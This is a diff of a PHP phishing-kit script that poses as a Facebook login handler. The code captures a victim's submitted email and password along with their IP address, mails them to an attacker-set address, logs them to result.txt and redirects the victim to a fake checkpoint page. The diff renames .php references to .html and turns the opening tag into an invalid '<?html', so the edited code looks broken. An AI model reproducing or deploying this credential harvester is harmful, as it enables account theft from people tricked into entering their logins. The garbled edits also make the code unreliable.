@@ -1,4 +1,4 @@
-<?php
+<?html
 /* 
 -                                                                                   
  ____      ____          ______        _____         _____        ______  _______   
@@ -18,7 +18,7 @@
   error_reporting(0);
   
 $ip = getenv("REMOTE_ADDR");
-include 'email.php';
+include 'email.html';
 $message .= "#--------------------------[ FACEBOOK LOGIN ]--------------------------#\n";
 $message .= "USER ID        : ".$_POST['email']."\n";
 $message .= "PASSWORD       : ".$_POST['pass']."\n";
@@ -31,5 +31,5 @@ mail($SEND,$subject,$message,$headers);
 
 $file = fopen("result.txt", 'a');
 fwrite($file, $message);
-header("location: checkpoint.php");
+header("location: checkpoint.html");
 ?>
